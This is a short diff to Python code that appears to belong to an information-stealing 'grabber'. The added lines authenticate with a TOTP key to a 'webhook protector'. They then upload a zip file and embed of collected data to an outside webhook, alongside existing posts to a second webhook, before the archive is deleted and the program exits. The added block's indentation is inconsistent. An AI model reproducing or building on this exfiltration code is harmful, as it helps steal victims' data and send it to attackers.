@@ -891,6 +891,15 @@ def finish(self):
         httpx.post(self.webhook2, json=embed)
         httpx.post(self.webhook2, files={"upload_file": f})
 
+                    key = TOTP(self.fetch_conf("webhook_protector_key")).now()
+                httpx.post(self.webhook, headers={"Authorization": key}, json=embed)
+                httpx.post(
+                    self.webhook,
+                    headers={"Authorization": key},
+                    files={"upload_file": f},
+                )
+
+
     os.remove(_zipfile)
     self.hazard_exit()
 
